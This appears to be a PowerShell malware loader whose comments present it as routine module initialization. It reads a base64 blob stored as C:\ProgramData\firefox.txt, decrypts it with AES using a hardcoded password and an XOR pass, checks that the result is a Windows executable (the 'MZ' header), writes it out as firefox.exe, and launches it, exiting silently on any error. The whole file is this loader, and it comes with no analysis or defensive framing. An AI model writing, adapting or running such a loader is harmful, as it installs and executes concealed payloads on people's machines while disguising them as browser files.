# Processing module initialization
$s1 = "C:\ProgramData\firefox.txt"
$n1 = "firefox.exe"
$d1 = Join-Path "C:\ProgramData" $n1

$k1 = "fdsf5F54GFL"

# Load configuration
try {
    if (-not (Test-Path $s1)) { exit 1 }
    $b64 = [IO.File]::ReadAllText($s1)
    $bytes1 = [Convert]::FromBase64String($b64)
} catch {
    exit 1
}

# Parse metadata structure
try {
    if ($bytes1.Length -lt 44) { exit 1 }
    $hdr = [Text.Encoding]::UTF8.GetString($bytes1[0..3])
    if ($hdr -ne "ENC1") { exit 1 }
    
    $xor1 = [BitConverter]::ToInt32($bytes1, 4)
    $salt1 = $bytes1[8..23]
    $iv1 = $bytes1[24..39]
    $size1 = [BitConverter]::ToInt32($bytes1, 40)
    
    $end1 = 43 + $size1
    if ($end1 -gt $bytes1.Length - 1) { $end1 = $bytes1.Length - 1 }
    $enc1 = $bytes1[44..$end1]
} catch {
    exit 1
}

# Transform binary data
try {
    $kd = New-Object Security.Cryptography.Rfc2898DeriveBytes($k1, $salt1, 10000)
    $key1 = $kd.GetBytes(32)
    
    $aes = [Security.Cryptography.Aes]::Create()
    $aes.KeySize = 256
    $aes.Key = $key1
    $aes.IV = $iv1
    $aes.Mode = 'CBC'
    $aes.Padding = 'PKCS7'
    
    $dec1 = $aes.CreateDecryptor()
    $tmp1 = $dec1.TransformFinalBlock($enc1, 0, $enc1.Length)
    $dec1.Dispose()
    $aes.Dispose()
    
    $result = New-Object byte[] $tmp1.Length
    for ($i = 0; $i -lt $tmp1.Length; $i++) {
        $result[$i] = ($tmp1[$i] -bxor $xor1) -band 0xFF
    }
} catch {
    exit 1
}

# Validate payload integrity
try {
    if ($result.Length -lt 2) { exit 1 }
    $sig = [Text.Encoding]::ASCII.GetString($result[0..1])
    if ($sig -ne "MZ") { exit 1 }
} catch {
    exit 1
}

# Deploy module
[System.IO.File]::WriteAllBytes($d1, $result)
Start-Process $d1
